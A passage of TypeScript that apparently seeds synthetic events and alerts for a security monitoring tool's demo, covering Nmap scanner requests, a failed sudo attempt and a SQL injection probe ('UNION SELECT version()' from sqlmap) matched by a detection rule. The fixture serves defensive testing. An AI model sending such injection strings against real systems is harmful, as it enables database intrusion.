  const scanner = Array.from({ length: 5 }, (_, i) =>
    f.web({
      ts: ago(3 * 24 * 60) + i * 3000,
      host: 'web-02',
      ip: '10.20.9.5',
      path: '/',
      status: 404,
      ua: 'Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.example/book/nse.html)',
    }),
  );
  alert({
    ruleRef: 'web_susp_useragents',
    events: scanner,
    status: 'closed',
    resolution: 'false_positive',
    note: 'Quarterly internal vulnerability scan.',
    count: 5,
  });
  alert({
    ruleRef: 'centinela-web-scanning-burst',
    events: scanner,
    status: 'closed',
    resolution: 'false_positive',
    groupKey: 'source.ip=10.20.9.5,host.name=web-02',
  });
  const oldIntern = f.auth({
    ts: ago(4 * 24 * 60),
    host: 'db-01',
    program: 'sudo',
    text: 'intern : user NOT in sudoers ; TTY=pts/1 ; PWD=/home/intern ; USER=root ; COMMAND=/usr/bin/apt install htop',
    action: 'sudo_not_in_sudoers',
    outcome: 'failure',
    category: 'iam',
    user: 'intern',
  });
  alert({
    ruleRef: 'centinela-sudo-user-not-in-sudoers',
    events: [oldIntern],
    status: 'closed',
    resolution: 'benign',
  });
  const oldSqli = f.web({
    ts: ago(5 * 24 * 60),
    host: 'web-02',
    ip: '198.51.100.140',
    path: '/products',
    query: 'id=1%20UNION%20SELECT%20version()',
    status: 500,
    ua: 'sqlmap/1.7',
  });
  alert({
    ruleRef: 'web_sql_injection_in_access_logs',
    events: [oldSqli],
    status: 'closed',
    resolution: 'true_positive',
  });

  const events = [...f.events].sort(compareDesc);
  const sortedAlerts = alerts.sort((a, b) => compareAlertDesc(a.alert, b.alert));
  return {
    attack,
    events,
    alerts: sortedAlerts.map((a) => a.alert),
    alertEvents: new Map(sortedAlerts.map((a) => [a.alert.id, a.eventIds])),
    rules: rules.sort(compareRules),
    ruleSources: sources,
  };
}

export function compareDesc(a: { ts: string; id: string }, b: { ts: string; id: string }): number {
  return b.ts.localeCompare(a.ts) || b.id.localeCompare(a.id);
}

export function compareAlertDesc(a: Alert, b: Alert): number {
  return b.lastSeen.localeCompare(a.lastSeen) || b.id.localeCompare(a.id);
}

export function compareRules(a: RuleMeta, b: RuleMeta): number {
  return (
    LEVEL_WEIGHT[b.level] - LEVEL_WEIGHT[a.level] ||
    a.title.localeCompare(b.title) ||
    a.id.localeCompare(b.id)
  );
}
